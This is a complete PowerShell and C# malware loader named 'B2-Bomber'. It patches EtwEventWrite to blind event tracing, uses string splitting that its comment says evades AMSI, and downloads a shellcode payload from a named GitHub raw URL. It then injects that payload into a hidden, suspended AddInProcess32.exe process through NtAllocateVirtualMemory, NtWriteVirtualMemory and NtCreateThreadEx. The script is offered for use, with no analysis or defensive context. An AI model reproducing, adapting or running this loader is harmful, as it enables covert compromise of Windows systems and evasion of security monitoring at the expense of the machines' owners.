Write-Host "[*] B2-Bomber Starting (Managed Heap Safe Harbor)..." -ForegroundColor Cyan

$code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class Loader {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static string DisableDefenses() {
        try {
            // String concatenation to bypass AMSI static analysis
            IntPtr lib = LoadLibrary("nt" + "dll");
            IntPtr addr = GetProcAddress(lib, "Etw" + "Event" + "Write");
            uint old;
            VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
            Marshal.WriteByte(addr, 0xC3);
            return "OK";
        } catch (Exception ex) {
            return "Failed: " + ex.Message;
        }
    }

    public static string Execute(string url) {
        try {
            string result = DisableDefenses();
            Console.WriteLine("[*] Defense bypass: " + result);
            
            Console.WriteLine("[*] Downloading payload into Managed Heap...");
            byte[] payload;
            using (var client = new WebClient()) {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                payload = client.DownloadData(url);
            }
            Console.WriteLine("[+] Downloaded " + payload.Length + " bytes");
            
            string targetPath = System.Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
            Console.WriteLine("[*] Target: AddInProcess32.exe");
            
            Console.WriteLine("[*] Starting process (suspended)...");
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.dwFlags = 1;
            si.wShowWindow = 0;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
            bool createResult = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x4 | 0x08000000, IntPtr.Zero, null, ref si, out pi);
            if (!createResult) {
                return "CreateProcess failed";
            }
            Console.WriteLine("[+] Process started: PID " + pi.dwProcessId + " (KEEPING SUSPENDED)");
            
            Console.WriteLine("[*] Allocating memory...");
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)payload.Length;
            uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddress, IntPtr.Zero, ref size, 0x3000, 0x40);
            if (status != 0) {
                return "NtAllocateVirtualMemory failed: 0x" + status.ToString("X");
            }
            
            Console.WriteLine("[*] Writing shellcode...");
            uint bytesWritten;
            status = NtWriteVirtualMemory(pi.hProcess, baseAddress, payload, (uint)payload.Length, out bytesWritten);
            if (status != 0) {
                 return "NtWriteVirtualMemory failed: 0x" + status.ToString("X");
            }
            
            Console.WriteLine("[*] Creating shellcode thread...");
            IntPtr threadHandle;
            status = NtCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, pi.hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status != 0) {
                return "NtCreateThreadEx failed: 0x" + status.ToString("X");
            }
            
            Console.WriteLine("[+] Shellcode thread created and running");
            Console.WriteLine("[!] Main thread kept SUSPENDED to keep process alive");
            
            payload = null;
            GC.Collect();
            
            return "SUCCESS";
        } catch (Exception ex) {
            return "Exception: " + ex.Message;
        }
    }
}
"@

Write-Host "[*] Compiling injection engine..." -ForegroundColor Yellow
try {
    Add-Type -TypeDefinition $code -Language CSharp
    Write-Host "[+] Engine compiled" -ForegroundColor Green
} catch {
    Write-Host "[-] Compilation failed: $_" -ForegroundColor Red
    exit
}

Write-Host "[*] Executing..." -ForegroundColor Yellow
$result = [Loader]::Execute('https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin')
Write-Host " "

if ($result -eq "SUCCESS") {
    Write-Host "████████████████████████████████████" -ForegroundColor Green
    Write-Host "█  INJECTION SUCCESSFUL!          █" -ForegroundColor Green 
    Write-Host "█  Managed Heap Safe Harbor       █" -ForegroundColor Green
    Write-Host "█  Process kept alive (suspended) █" -ForegroundColor Green
    Write-Host "████████████████████████████████████" -ForegroundColor Green
} else {
    Write-Host "[-] FAILED: $result" -ForegroundColor Red
}